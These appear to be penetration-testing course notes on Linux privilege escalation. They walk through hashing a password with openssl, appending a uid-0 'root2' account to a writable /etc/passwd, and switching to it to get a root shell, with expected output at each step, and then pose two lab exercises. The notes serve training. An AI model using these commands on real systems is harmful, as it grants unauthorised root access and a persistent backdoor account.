# Abusing Password Authentication

Escalating privileges by editing /etc/passwd
>``` shell
>joe@debian-privesc:~$ openssl passwd w00t
>
># ========== Expected Result ==========
>Fdzt.eqJQ4s0g
># =====================================
>
>joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
>
>joe@debian-privesc:~$ su root2
>
># ========== Expected Result ==========
>Password: w00t
># =====================================
>
>root@debian-privesc:/home/joe# id
>
># ========== Expected Result ==========
>uid=0(root) gid=0(root) groups=0(root)
># =====================================
>```

Lab 1 - Connect to VM 1 and repeat the steps discussed in this section in order to obtain a root shell. Which hashing algorithm has been used to encrypt the attacker's password?
>``` shell
>
>```
>

Lab 2 - Connect to VM 2 and get the flag by elevating to a root shell through password authentication abuse.
>``` shell
>
>```
>
